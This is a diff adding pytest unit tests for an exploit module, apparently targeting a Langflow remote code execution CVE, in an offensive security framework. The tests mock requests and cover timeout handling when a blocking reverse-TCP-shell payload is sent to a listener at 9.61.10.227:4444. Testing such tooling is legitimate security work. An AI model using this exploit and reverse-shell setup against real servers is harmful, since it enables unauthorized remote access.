@@ -53,6 +53,60 @@ class TestTriggerVuln:
                 base_url=_BASE_URL, headers=_AUTH_HEADERS, code="x = 1"
             )
 
+    def test_blocking_connection_error_raises_blocking_disconnect(self):
+        from requests.exceptions import ConnectionError as RequestsConnectionError
+
+        from flowhound.vulnerabilities.exploits.cve_2026_9198 import (
+            _BlockingPayloadDisconnect,
+        )
+
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_9198.post",
+                side_effect=RequestsConnectionError("Remote end closed connection"),
+            ),
+            pytest.raises(_BlockingPayloadDisconnect),
+        ):
+            exploit.trigger_vuln(
+                base_url=_BASE_URL, headers=_AUTH_HEADERS, code="shell", blocking=True
+            )
+
+    def test_blocking_read_timeout_raises_blocking_disconnect(self):
+        from requests import ReadTimeout
+
+        from flowhound.vulnerabilities.exploits.cve_2026_9198 import (
+            _BlockingPayloadDisconnect,
+        )
+
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_9198.post",
+                side_effect=ReadTimeout(),
+            ),
+            pytest.raises(_BlockingPayloadDisconnect),
+        ):
+            exploit.trigger_vuln(
+                base_url=_BASE_URL, headers=_AUTH_HEADERS, code="shell", blocking=True
+            )
+
+    def test_blocking_uses_short_read_timeout(self):
+        mock_resp = _mock_resp(200)
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_9198.post",
+            return_value=mock_resp,
+        ) as mock_post:
+            exploit.trigger_vuln(
+                base_url=_BASE_URL, headers=_AUTH_HEADERS, code="shell", blocking=True
+            )
+        timeout_arg = mock_post.call_args.kwargs["timeout"]
+        assert isinstance(timeout_arg, tuple)
+        connect_t, read_t = timeout_arg
+        assert connect_t == exploit.TIMEOUT
+        assert read_t == 5
+
     def test_passes_proxies(self):
         mock_resp = _mock_resp(200)
         proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
@@ -183,6 +237,33 @@ class TestExploit:
         ):
             exploit.exploit(base_url=_BASE_URL, username="", password="")
         assert "subprocess" in mock_post.call_args.kwargs["json"]["code"]
+
+    def test_blocking_payload_read_timeout_returns_true(self):
+        """ReadTimeout on a blocking payload should be reported as success."""
+        from requests import ReadTimeout
+
+        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import (
+            Payload as ShellPayload,
+        )
+
+        auth_resp = _mock_resp(200, {"access_token": "test-token"})
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.get", return_value=auth_resp
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_9198.post",
+                side_effect=ReadTimeout(),
+            ),
+        ):
+            result = exploit.exploit(
+                base_url=_BASE_URL,
+                username="admin",
+                password="secret",
+                payload=ShellPayload(lhost="9.61.10.227", lport=4444),
+            )
+        assert result is True
 
     def test_with_proxies(self):
         auth_resp = _mock_resp(200, {"access_token": "test-token"})
